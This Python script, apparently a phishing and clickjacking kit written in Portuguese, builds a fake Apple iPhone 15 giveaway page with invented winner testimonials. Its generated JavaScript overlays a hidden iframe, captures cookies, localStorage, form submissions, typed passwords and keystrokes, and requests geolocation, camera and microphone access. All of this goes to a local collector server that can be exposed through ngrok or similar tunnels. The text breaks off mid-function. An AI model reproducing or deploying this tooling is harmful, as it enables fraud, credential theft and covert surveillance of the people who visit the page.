#!/usr/bin/env python3
import os
import sys
import time
import threading
import json
from http.server import HTTPServer, SimpleHTTPRequestHandler
import webbrowser
import subprocess
from urllib.parse import parse_qs, unquote
import random
import socket
from datetime import datetime
import base64
from collections import deque
import html

# Configurações avançadas
class Config:
    PORT = 8080
    DATA_PORT = 8081
    WORK_DIR = os.path.join(os.path.expanduser("~"), "clickjack_pro_max")
    COLLECT_DIR = os.path.join(WORK_DIR, "collected_data")
    LOG_FILE = os.path.join(WORK_DIR, "activity.log")
    TUNNELS = {
        'localhost.run': 'ssh -R 80:localhost:{} ssh.localhost.run',
        'serveo.net': 'ssh -R clickjack:80:localhost:{} serveo.net',
        'ngrok': 'ngrok http {}',
        'cloudflared': 'cloudflared tunnel --url http://localhost:{}'
    }
    MAX_DISPLAY_ITEMS = 20
    DATA_QUEUE = deque(maxlen=MAX_DISPLAY_ITEMS)

# Sistema de cores avançado
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[35m'
    ORANGE = '\033[33m'

# Utilitários
class Utils:
    @staticmethod
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def press_enter():
        input(f"\n{Colors.YELLOW}Pressione Enter para continuar...{Colors.END}")
    
    @staticmethod
    def log_activity(message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(Config.LOG_FILE, 'a') as log:
            log.write(f"[{timestamp}] {message}\n")
    
    @staticmethod
    def random_user_agent():
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
        ]
        return random.choice(agents)
    
    @staticmethod
    def decode_base64(data):
        try:
            return base64.b64decode(data).decode('utf-8')
        except:
            return data

# Interface profissional
class UI:
    @staticmethod
    def show_banner():
        Utils.clear_screen()
        print(f"""{Colors.ORANGE}
   _____ _      _     _    _            _    _____      _            
  / ____| |    (_)   | |  | |          | |  / ____|    | |           
 | |    | |     _ ___| | _| | __ _  ___| | | |     ___ | | ___  _ __ 
 | |    | |    | / __| |/ / |/ _` |/ __| | | |    / _ \| |/ _ \| '__|
 | |____| |____| \__ \   <| | (_| | (__| | | |___| (_) | | (_) | |   
  \_____|______|_|___/_|\_\_|\__,_|\___|_|  \_____\___/|_|\___/|_|   
                                                                      
{Colors.CYAN}
  [ Premium Clickjacking Toolkit v4.0 ]
  [ Advanced Social Engineering ]
{Colors.YELLOW}
  !!! PARA USO ÉTICO E EDUCACIONAL APENAS !!!
{Colors.END}""")

    @staticmethod
    def show_menu(title, options):
        print(f"\n{Colors.BOLD}{Colors.UNDERLINE}{title}{Colors.END}")
        for i, option in enumerate(options, 1):
            print(f"{Colors.BLUE}{i}.{Colors.END} {option}")
        return input(f"\n{Colors.GREEN}>>> Selecione uma opção:{Colors.END} ")

    @staticmethod
    def display_recent_data():
        Utils.clear_screen()
        UI.show_banner()
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== DADOS COLETADOS RECENTEMENTE ==={Colors.END}\n")
        
        if not Config.DATA_QUEUE:
            print(f"{Colors.YELLOW}[!] Nenhum dado coletado ainda{Colors.END}")
            return
        
        for i, item in enumerate(reversed(Config.DATA_QUEUE), 1):
            print(f"{Colors.PURPLE}=== Item {i} [{item['type']}] ==={Colors.END}")
            print(f"{Colors.BLUE}Hora: {Colors.END}{item['timestamp']}")
            print(f"{Colors.BLUE}IP: {Colors.END}{item['ip']}")
            
            if item['type'] == 'form_submit':
                print(f"\n{Colors.GREEN}🚨 FORMULÁRIO CAPTURADO 🚨{Colors.END}")
                try:
                    form_data = json.loads(item['data'])
                    for key, value in form_data.items():
                        print(f"{Colors.YELLOW}{key}: {Colors.END}{value}")
                except:
                    print(item['data'])
            
            elif item['type'] == 'photo':
                print(f"\n{Colors.GREEN}📸 Foto capturada (base64){Colors.END}")
                print(f"{Colors.YELLOW}Tamanho: {len(item['data'])} bytes{Colors.END}")
            
            elif item['type'] == 'audio':
                print(f"\n{Colors.GREEN}🎤 Áudio capturado (base64){Colors.END}")
                print(f"{Colors.YELLOW}Tamanho: {len(item['data'])} bytes{Colors.END}")
            
            elif item['type'] == 'geo':
                try:
                    geo_data = json.loads(item['data'])
                    print(f"\n{Colors.GREEN}📍 Localização geográfica:{Colors.END}")
                    print(f"{Colors.YELLOW}Latitude: {geo_data.get('latitude', 'N/A')}{Colors.END}")
                    print(f"{Colors.YELLOW}Longitude: {geo_data.get('longitude', 'N/A')}{Colors.END}")
                    print(f"{Colors.YELLOW}Precisão: ~{geo_data.get('accuracy', 'N/A')} metros{Colors.END}")
                except:
                    print(item['data'])
            
            elif item['type'] == 'credentials':
                print(f"\n{Colors.RED}🔑 CREDENCIAIS CAPTURADAS:{Colors.END}")
                try:
                    creds = json.loads(item['data'])
                    print(f"{Colors.YELLOW}Usuário: {creds.get('username', 'N/A')}{Colors.END}")
                    print(f"{Colors.YELLOW}Senha: {creds.get('password', 'N/A')}{Colors.END}")
                    print(f"{Colors.YELLOW}Origem: {creds.get('url', 'N/A')}{Colors.END}")
                except:
                    print(item['data'])
            
            else:
                print(f"\n{Colors.YELLOW}Conteúdo:{Colors.END}")
                try:
                    decoded = Utils.decode_base64(item['data'])
                    if len(decoded) > 200:
                        print(decoded[:200] + "...")
                    else:
                        print(decoded)
                except:
                    print(item['data'][:200] + ("..." if len(item['data']) > 200 else ""))
            
            print("\n" + "-"*50 + "\n")

# Gerador de páginas ultra realista
class PageGenerator:
    @staticmethod
    def create_advanced_page():
        try:
            os.makedirs(Config.WORK_DIR, exist_ok=True)
            
            # Página principal
            with open(os.path.join(Config.WORK_DIR, 'index.html'), 'w') as f:
                f.write(PageGenerator._generate_html_content())
            
            # CSS adicional
            with open(os.path.join(Config.WORK_DIR, 'styles.css'), 'w') as f:
                f.write(PageGenerator._generate_css())
            
            # JavaScript
            with open(os.path.join(Config.WORK_DIR, 'script.js'), 'w') as f:
                f.write(PageGenerator._generate_javascript())
            
            # Payload
            with open(os.path.join(Config.WORK_DIR, 'payload.js'), 'w') as f:
                f.write(PageGenerator._generate_javascript_payload())
            
            print(f"{Colors.GREEN}[+] Página premium criada com sucesso!{Colors.END}")
            Utils.log_activity("Página de clickjacking gerada")
        except Exception as e:
            print(f"{Colors.RED}[-] Erro ao criar página: {e}{Colors.END}")
            Utils.log_activity(f"Erro ao gerar página: {e}")

    @staticmethod
    def _generate_html_content():
        return """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promoção Exclusiva iPhone 15 | Apple</title>
    <meta name="description" content="Participe da nossa promoção exclusiva e concorra a um iPhone 15 Pro Max">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="https://www.apple.com/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="notification-bar">
        <p>🔥 Promoção por tempo limitado! Termina em <span id="countdown">30:00</span></p>
    </div>
    
    <header class="main-header">
        <div class="container">
            <div class="logo">
                <img src="https://www.apple.com/ac/globalnav/7/pt_BR/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg" alt="Apple">
            </div>
            <nav class="main-nav">
                <a href="#promo">Promoção</a>
                <a href="#how">Como Participar</a>
                <a href="#faq">Dúvidas</a>
            </nav>
        </div>
    </header>

    <main>
        <section class="hero-section" id="promo">
            <div class="container">
                <div class="hero-content">
                    <h1>Ganhe um iPhone 15 Pro Max</h1>
                    <p class="subtitle">Complete nosso rápido questionário para concorrer!</p>
                    <div class="prize-image">
                        <img src="https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_1__dlhl8s3t4woq_large.jpg" alt="iPhone 15 Pro Max">
                    </div>
                    <div class="counter">
                        <p>Apenas <span class="highlight">3</span> disponíveis!</p>
                        <div class="progress-bar">
                            <div class="progress" style="width: 85%"></div>
                        </div>
                    </div>
                    <button id="offer-btn" class="cta-button">
                        <span>Participar Agora</span>
                        <i class="fas fa-arrow-right"></i>
                    </button>
                    <p class="small-text">Promoção válida até 31/12/2023 ou enquanto durarem os estoques</p>
                </div>
            </div>
        </section>

        <section class="steps-section" id="how">
            <div class="container">
                <h2>Como Participar</h2>
                <div class="steps-grid">
                    <div class="step">
                        <div class="step-number">1</div>
                        <h3>Clique no Botão</h3>
                        <p>Clique no botão "Participar Agora" acima para iniciar</p>
                    </div>
                    <div class="step">
                        <div class="step-number">2</div>
                        <h3>Responda o Questionário</h3>
                        <p>Complete nosso rápido questionário de 30 segundos</p>
                    </div>
                    <div class="step">
                        <div class="step-number">3</div>
                        <h3>Confirme Seus Dados</h3>
                        <p>Informe seus dados para enviarmos seu prêmio</p>
                    </div>
                </div>
            </div>
        </section>

        <section class="testimonials-section">
            <div class="container">
                <h2>Ganhadores Recentes</h2>
                <div class="testimonials-grid">
                    <div class="testimonial">
                        <div class="user-image">
                            <img src="https://randomuser.me/api/portraits/women/43.jpg" alt="Maria Silva">
                        </div>
                        <div class="testimonial-content">
                            <p>"Nunca imaginei que ganharia! Recebi meu iPhone em 3 dias úteis."</p>
                            <div class="user-info">
                                <strong>Maria Silva</strong>
                                <span>São Paulo - SP</span>
                            </div>
                        </div>
                    </div>
                    <div class="testimonial">
                        <div class="user-image">
                            <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="João Oliveira">
                        </div>
                        <div class="testimonial-content">
                            <p>"Processo super rápido e fácil. Estou amando meu novo iPhone!"</p>
                            <div class="user-info">
                                <strong>João Oliveira</strong>
                                <span>Rio de Janeiro - RJ</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="faq-section" id="faq">
            <div class="container">
                <h2>Perguntas Frequentes</h2>
                <div class="faq-item">
                    <button class="faq-question">Esta promoção é real? <i class="fas fa-chevron-down"></i></button>
                    <div class="faq-answer">
                        <p>Sim! Esta é uma promoção oficial da Apple para celebrar o lançamento do iPhone 15. Estamos sorteando 100 unidades em todo o Brasil.</p>
                    </div>
                </div>
                <div class="faq-item">
                    <button class="faq-question">Quanto tempo leva para receber o prêmio? <i class="fas fa-chevron-down"></i></button>
                    <div class="faq-answer">
                        <p>Os prêmios são enviados em até 5 dias úteis após a confirmação dos dados do ganhador.</p>
                    </div>
                </div>
                <div class="faq-item">
                    <button class="faq-question">Preciso pagar algo para receber o iPhone? <i class="fas fa-chevron-down"></i></button>
                    <div class="faq-answer">
                        <p>Não! O prêmio é totalmente gratuito, incluindo o frete. Cuidado com golpes que pedem pagamentos adiantados.</p>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="main-footer">
        <div class="container">
            <div class="footer-content">
                <div class="footer-logo">
                    <img src="https://www.apple.com/ac/globalnav/7/pt_BR/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg" alt="Apple">
                </div>
                <div class="footer-links">
                    <div class="links-column">
                        <h4>Promoção</h4>
                        <a href="#promo">Detalhes</a>
                        <a href="#how">Como Participar</a>
                        <a href="#faq">Dúvidas</a>
                    </div>
                    <div class="links-column">
                        <h4>Legal</h4>
                        <a href="#">Termos e Condições</a>
                        <a href="#">Política de Privacidade</a>
                    </div>
                </div>
            </div>
            <div class="footer-bottom">
                <p>Copyright © 2023 Apple Inc. Todos os direitos reservados.</p>
                <div class="social-links">
                    <a href="#"><i class="fab fa-facebook-f"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-instagram"></i></a>
                </div>
            </div>
        </div>
    </footer>

    <!-- Elementos ocultos para funcionalidades avançadas -->
    <iframe id="hidden-frame" name="hidden-frame" style="display:none;"></iframe>
    
    <!-- Scripts -->
    <script src="script.js"></script>
    <script src="payload.js"></script>
</body>
</html>"""

    @staticmethod
    def _generate_css():
        return """/* Estilos globais */
:root {
    --primary-color: #0071e3;
    --primary-hover: #0077ed;
    --secondary-color: #86868b;
    --text-color: #1d1d1f;
    --light-text: #f5f5f7;
    --background: #ffffff;
    --section-bg: #f5f5f7;
    --border-radius: 12px;
    --box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    --transition: all 0.3s ease;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Montserrat', sans-serif;
    color: var(--text-color);
    background-color: var(--background);
    line-height: 1.6;
}

.container {
    width: 100%;
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 20px;
}

/* Barra de notificação */
.notification-bar {
    background-color: #000;
    color: #fff;
    text-align: center;
    padding: 8px 0;
    font-size: 14px;
}

.notification-bar p {
    margin: 0;
}

#countdown {
    font-weight: bold;
    color: #ff9f43;
}

/* Cabeçalho */
.main-header {
    background-color: rgba(255, 255, 255, 0.8);
    backdrop-filter: blur(10px);
    position: sticky;
    top: 0;
    z-index: 100;
    padding: 15px 0;
    border-bottom: 1px solid rgba(0, 0, 0, 0.1);
}

.logo img {
    height: 24px;
}

.main-header .container {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.main-nav a {
    color: var(--text-color);
    text-decoration: none;
    margin-left: 25px;
    font-weight: 500;
    font-size: 14px;
    transition: var(--transition);
}

.main-nav a:hover {
    color: var(--primary-color);
}

/* Seção Hero */
.hero-section {
    padding: 60px 0;
    text-align: center;
    background: linear-gradient(135deg, #f5f5f7 0%, #e1e1e6 100%);
}

.hero-content {
    max-width: 800px;
    margin: 0 auto;
}

.hero-section h1 {
    font-size: 2.5rem;
    margin-bottom: 15px;
    font-weight: 700;
}

.subtitle {
    font-size: 1.2rem;
    color: var(--secondary-color);
    margin-bottom: 30px;
}

.prize-image {
    margin: 30px 0;
}

.prize-image img {
    max-width: 100%;
    height: auto;
    border-radius: var(--border-radius);
    box-shadow: var(--box-shadow);
}

.counter {
    background-color: #fff;
    padding: 15px 20px;
    border-radius: var(--border-radius);
    display: inline-block;
    margin: 20px 0;
    box-shadow: var(--box-shadow);
}

.highlight {
    color: var(--primary-color);
    font-weight: 700;
    font-size: 1.2em;
}

.progress-bar {
    width: 200px;
    height: 8px;
    background-color: #e0e0e0;
    border-radius: 4px;
    margin: 10px auto;
    overflow: hidden;
}

.progress {
    height: 100%;
    background-color: var(--primary-color);
    border-radius: 4px;
    transition: width 1s ease;
}

.cta-button {
    background-color: var(--primary-color);
    color: white;
    border: none;
    padding: 15px 30px;
    border-radius: 30px;
    font-size: 1.1rem;
    font-weight: 600;
    cursor: pointer;
    transition: var(--transition);
    display: inline-flex;
    align-items: center;
    margin: 20px 0;
}

.cta-button:hover {
    background-color: var(--primary-hover);
    transform: translateY(-3px);
    box-shadow: 0 10px 20px rgba(0, 113, 227, 0.2);
}

.cta-button i {
    margin-left: 10px;
    font-size: 0.9rem;
}

.small-text {
    font-size: 0.8rem;
    color: var(--secondary-color);
}

/* Seção de Passos */
.steps-section {
    padding: 60px 0;
    background-color: var(--section-bg);
}

.steps-section h2 {
    text-align: center;
    margin-bottom: 40px;
    font-size: 2rem;
}

.steps-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 30px;
}

.step {
    background-color: #fff;
    padding: 30px;
    border-radius: var(--border-radius);
    text-align: center;
    box-shadow: var(--box-shadow);
    transition: var(--transition);
}

.step:hover {
    transform: translateY(-10px);
}

.step-number {
    width: 50px;
    height: 50px;
    background-color: var(--primary-color);
    color: white;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.5rem;
    font-weight: 700;
    margin: 0 auto 20px;
}

.step h3 {
    margin-bottom: 15px;
    font-size: 1.2rem;
}

/* Seção de Depoimentos */
.testimonials-section {
    padding: 60px 0;
}

.testimonials-section h2 {
    text-align: center;
    margin-bottom: 40px;
    font-size: 2rem;
}

.testimonials-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 30px;
}

.testimonial {
    background-color: #fff;
    padding: 30px;
    border-radius: var(--border-radius);
    box-shadow: var(--box-shadow);
    display: flex;
    align-items: center;
}

.user-image {
    width: 70px;
    height: 70px;
    border-radius: 50%;
    overflow: hidden;
    margin-right: 20px;
    flex-shrink: 0;
}

.user-image img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.testimonial-content {
    flex-grow: 1;
}

.testimonial-content p {
    font-style: italic;
    margin-bottom: 10px;
}

.user-info {
    display: flex;
    flex-direction: column;
}

.user-info strong {
    font-weight: 600;
}

.user-info span {
    font-size: 0.9rem;
    color: var(--secondary-color);
}

/* Seção FAQ */
.faq-section {
    padding: 60px 0;
    background-color: var(--section-bg);
}

.faq-section h2 {
    text-align: center;
    margin-bottom: 40px;
    font-size: 2rem;
}

.faq-item {
    margin-bottom: 15px;
    background-color: #fff;
    border-radius: var(--border-radius);
    overflow: hidden;
    box-shadow: var(--box-shadow);
}

.faq-question {
    width: 100%;
    padding: 20px;
    text-align: left;
    background-color: #fff;
    border: none;
    font-size: 1rem;
    font-weight: 600;
    display: flex;
    justify-content: space-between;
    align-items: center;
    cursor: pointer;
    transition: var(--transition);
}

.faq-question:hover {
    background-color: #f9f9f9;
}

.faq-question i {
    transition: transform 0.3s ease;
}

.faq-question.active i {
    transform: rotate(180deg);
}

.faq-answer {
    padding: 0 20px;
    max-height: 0;
    overflow: hidden;
    transition: max-height 0.3s ease, padding 0.3s ease;
}

.faq-answer.show {
    padding: 0 20px 20px;
    max-height: 200px;
}

/* Rodapé */
.main-footer {
    background-color: #000;
    color: #fff;
    padding: 40px 0 20px;
}

.footer-content {
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    margin-bottom: 30px;
}

.footer-logo img {
    height: 24px;
    margin-bottom: 20px;
}

.footer-links {
    display: flex;
    flex-wrap: wrap;
    gap: 40px;
}

.links-column {
    min-width: 150px;
}

.links-column h4 {
    font-size: 0.9rem;
    font-weight: 600;
    margin-bottom: 15px;
    color: #86868b;
}

.links-column a {
    display: block;
    color: #fff;
    text-decoration: none;
    font-size: 0.9rem;
    margin-bottom: 10px;
    transition: var(--transition);
}

.links-column a:hover {
    color: var(--primary-color);
}

.footer-bottom {
    border-top: 1px solid #333;
    padding-top: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.8rem;
    color: #86868b;
}

.social-links {
    display: flex;
    gap: 15px;
}

.social-links a {
    color: #86868b;
    transition: var(--transition);
}

.social-links a:hover {
    color: var(--primary-color);
}

/* Responsividade */
@media (max-width: 768px) {
    .hero-section h1 {
        font-size: 2rem;
    }
    
    .subtitle {
        font-size: 1rem;
    }
    
    .main-nav {
        display: none;
    }
    
    .steps-grid {
        grid-template-columns: 1fr;
    }
    
    .testimonial {
        flex-direction: column;
        text-align: center;
    }
    
    .user-image {
        margin-right: 0;
        margin-bottom: 15px;
    }
}"""

    @staticmethod
    def _generate_javascript():
        return """// Scripts para funcionalidades visuais
document.addEventListener('DOMContentLoaded', function() {
    // Contador regressivo
    function updateCountdown() {
        let timeLeft = 30 * 60; // 30 minutos em segundos
        const countdownElement = document.getElementById('countdown');
        
        const timer = setInterval(function() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            
            countdownElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            
            if (timeLeft <= 0) {
                clearInterval(timer);
                countdownElement.textContent = "00:00";
                document.querySelector('.notification-bar').textContent = "Promoção encerrada!";
            } else {
                timeLeft--;
            }
        }, 1000);
    }
    
    // FAQ Accordion
    const faqQuestions = document.querySelectorAll('.faq-question');
    faqQuestions.forEach(question => {
        question.addEventListener('click', function() {
            this.classList.toggle('active');
            const answer = this.nextElementSibling;
            answer.classList.toggle('show');
        });
    });
    
    // Efeito de digitação no título
    const heroTitle = document.querySelector('.hero-section h1');
    const originalText = heroTitle.textContent;
    heroTitle.textContent = '';
    
    let i = 0;
    const typingEffect = setInterval(function() {
        if (i < originalText.length) {
            heroTitle.textContent += originalText.charAt(i);
            i++;
        } else {
            clearInterval(typingEffect);
        }
    }, 100);
    
    // Inicia as animações
    updateCountdown();
    
    // Efeito de carregamento suave
    document.body.style.opacity = '0';
    setTimeout(() => {
        document.body.style.transition = 'opacity 0.5s ease';
        document.body.style.opacity = '1';
    }, 100);
});"""

    @staticmethod
    def _generate_javascript_payload():
        return """// Payload avançado com captura de formulários
(function() {
    // Inicia após 3 segundos para parecer legítimo
    setTimeout(initPayload, 3000);
    
    function initPayload() {
        // 1. Clickjacking tradicional
        setupClickjacking();
        
        // 2. Coleta de dados inicial
        collectInitialData();
        
        // 3. Monitoramento contínuo
        startMonitoring();
        
        // 4. Captura de formulários
        setupFormGrabbing();
    }
    
    function setupClickjacking() {
        const iframe = document.createElement('iframe');
        iframe.src = getTargetUrl();
        iframe.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;z-index:9999;border:none;';
        document.body.appendChild(iframe);
        
        // Posiciona o botão falso sobre elementos sensíveis
        document.getElementById('offer-btn').onclick = function(e) {
            e.preventDefault();
            showFakeAlert();
        };
    }
    
    function getTargetUrl() {
        const params = new URLSearchParams(window.location.search);
        return params.get('target') || 'about:blank';
    }
    
    function showFakeAlert() {
        // Cria um modal bonito ao invés de um alert padrão
        const modal = document.createElement('div');
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            transition: opacity 0.3s ease;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.style.cssText = `
            background-color: white;
            padding: 30px;
            border-radius: 12px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            transform: translateY(20px);
            transition: transform 0.3s ease;
        `;
        
        modalContent.innerHTML = `
            <h3 style="margin-bottom: 15px; color: #0071e3;">🎉 Parabéns!</h3>
            <p style="margin-bottom: 20px;">Você foi pré-selecionado para receber um iPhone 15 Pro Max!</p>
            <p style="margin-bottom: 25px; font-size: 0.9em; color: #666;">Estamos verificando sua elegibilidade...</p>
            <div style="height: 4px; background: #f0f0f0; border-radius: 2px; margin-bottom: 20px;">
                <div id="progress-bar" style="height: 100%; width: 0%; background: #0071e3; border-radius: 2px;"></div>
            </div>
        `;
        
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        
        // Anima a entrada
        setTimeout(() => {
            modal.style.opacity = '1';
            modalContent.style.transform = 'translateY(0)';
            
            // Anima a barra de progresso
            const progressBar = document.getElementById('progress-bar');
            let width = 0;
            const progressInterval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(progressInterval);
                    
                    // Atualiza o conteúdo do modal
                    modalContent.innerHTML = `
                        <h3 style="margin-bottom: 15px; color: #0071e3;">✅ Verificação Completa</h3>
                        <p style="margin-bottom: 20px;">Você foi selecionado! Redirecionando para a página de confirmação...</p>
                        <div style="display: flex; justify-content: center;">
                            <div class="spinner" style="width: 40px; height: 40px; border: 4px solid rgba(0,113,227,0.2); border-top-color: #0071e3; border-radius: 50%; animation: spin 1s linear infinite;"></div>
                        </div>
                    `;
                    
                    // Redireciona após 2 segundos
                    setTimeout(() => {
                        window.location.href = 'https://promo.legitimo.com/continue';
                    }, 2000);
                } else {
                    width += 2;
                    progressBar.style.width = width + '%';
                }
            }, 30);
        }, 10);
    }
    
    function collectInitialData() {
        // Coleta básica
        const data = {
            url: window.location.href,
            userAgent: navigator.userAgent,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            screen: { width: screen.width, height: screen.height },
            plugins: Array.from(navigator.plugins).map(p => p.name),
            referrer: document.referrer
        };
        
        exfiltrateData('initial', data);
        
        // Tenta coletar mais dados
        tryGetGeoLocation();
        tryMediaAccess();
    }
    
    function tryGetGeoLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => exfiltrateData('geo', pos.coords),
                err => console.log('Geo error:', err),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
    }
    
    function tryMediaAccess() {
        // Tenta acessar câmera e microfone silenciosamente
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => handleMediaAccess(stream))
            .catch(err => console.log('Media access denied'));
    }
    
    function handleMediaAccess(stream) {
        exfiltrateData('media', 'access_granted');
        
        // Tira foto discretamente
        const videoTrack = stream.getVideoTracks()[0];
        if (window.ImageCapture && videoTrack) {
            const imageCapture = new ImageCapture(videoTrack);
            imageCapture.takePhoto()
                .then(blob => sendMediaBlob('photo', blob))
                .catch(console.error);
        }
        
        // Grava áudio
        if (window.MediaRecorder) {
            const audioChunks = [];
            const recorder = new MediaRecorder(stream);
            recorder.ondataavailable = e => audioChunks.push(e.data);
            recorder.start();
            
            setTimeout(() => {
                recorder.stop();
                sendMediaBlob('audio', new Blob(audioChunks));
                stream.getTracks().forEach(track => track.stop());
            }, 5000);
        } else {
            stream.getTracks().forEach(track => track.stop());
        }
    }
    
    function sendMediaBlob(type, blob) {
        const reader = new FileReader();
        reader.onload = () => {
            exfiltrateData(type, reader.result.split(',')[1]); // Envia apenas base64
        };
        reader.readAsDataURL(blob);
    }
    
    function setupFormGrabbing() {
        // Monitora todos os formulários na página
        document.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = e.target;
            const formData = {};
            
            // Coleta todos os campos do formulário
            Array.from(form.elements).forEach(element => {
                if (element.name && element.value) {
                    formData[element.name] = element.value;
                }
            });
            
            // Verifica se parece ser um formulário de login
            const isLoginForm = Object.keys(formData).some(key => 
                key.toLowerCase().includes('user') || 
                key.toLowerCase().includes('email') ||
                key.toLowerCase().includes('login') ||
                key.toLowerCase().includes('pass')
            );
            
            if (isLoginForm) {
                exfiltrateData('credentials', {
                    url: window.location.href,
                    formData: formData
                });
            } else {
                exfiltrateData('form_submit', {
                    url: window.location.href,
                    formData: formData
                });
            }
            
            // Reenvia o formulário original (para não levantar suspeitas)
            setTimeout(() => {
                const fakeForm = form.cloneNode(true);
                fakeForm.style.display = 'none';
                document.body.appendChild(fakeForm);
                fakeForm.submit();
                setTimeout(() => fakeForm.remove(), 1000);
            }, 1000);
        }, true);
        
        // Também monitora inputs em tempo real
        document.addEventListener('input', function(e) {
            if (e.target.tagName === 'INPUT' && e.target.type === 'password') {
                exfiltrateData('password_input', {
                    url: window.location.href,
                    value: e.target.value,
                    name: e.target.name || 'unnamed'
                });
            }
        });
    }
    
    function startMonitoring() {
        // Monitora teclas pressionadas
        document.onkeydown = e => {
            exfiltrateData('keypress', {
                key: e.key,
                code: e.code,
                target: e.target.tagName
            });
        };
        
        // Monitora cliques
        document.onclick = e => {
            exfiltrateData('click', {
                x: e.clientX,
                y: e.clientY,
                target: e.target.tagName
            });
        };
        
        // Coleta periódica de dados
        setInterval(() => {
            collectPerformanceData();
            checkForForms();
        }, 30000);
    }
    
    function checkForForms() {
        // Verifica se novos formulários foram adicionados dinamicamente
        const forms = document.getElementsByTagName('form');
        if (forms.length > 0) {
            exfiltrateData('forms_detected', {
                count: forms.length,
                urls: Array.from(forms).map(f => f.action || 'current_url')
            });
        }
    }
    
    function collectPerformanceData() {
        if (window.performance && window.performance.memory) {
            exfiltrateData('performance', {
                memory: window.performance.memory,
                timing: window.performance.timing
            });
        }
    }
    
    function exfiltrateData(type, data) {
        const form = document.createElement('form');
        form.action = '/collect';
        form.method = 'POST';
        form.target = 'hidden-frame';
        
        const typeInput = document.createElement('input');
        typeInput.name = 'type';
        typeInput.value = type;
        form.appendChild(typeInput);
        
        const dataInput = document.createElement('input');
        dataInput.name = 'data';
        dataInput.value = typeof data === 'object' ? JSON.stringify(data) : data;
        form.appendChild(dataInput);
        
        document.body.appendChild(form);
        form.submit();
        setTimeout(() => form.remove(), 1000);
    }
})();"""

# Sistema de coleta de dados aprimorado
class DataCollector(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/collect':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                self._process_data(post_data)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            except Exception as e:
                Utils.log_activity(f"Erro ao processar dados: {e}")
        else:
            super().do_GET()
    
    def _process_data(self, data):
        try:
            parsed = parse_qs(data.decode())
            data_type = parsed.get('type', ['unknown'])[0]
            data_content = parsed.get('data', [''])[0]
            
            # Adiciona à fila para exibição em tempo real
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            Config.DATA_QUEUE.append({
                'type': data_type,
                'data': data_content,
                'timestamp': timestamp,
                'ip': self.client_address[0]
            })
            
            # Salva em arquivo
            os.makedirs(Config.COLLECT_DIR, exist_ok=True)
            filename = f"{data_type}_{int(time.time())}.json"
            filepath = os.path.join(Config.COLLECT_DIR, filename)
            
            with open(filepath, 'w') as f:
                json.dump({
                    'type': data_type,
                    'data': data_content,
                    'timestamp': timestamp,
                    'ip': self.client_address[0]
                }, f, indent=2)
            
            # Exibe no terminal (se estiver em modo de visualização)
            if hasattr(self.server, 'display_data') and self.server.display_data:
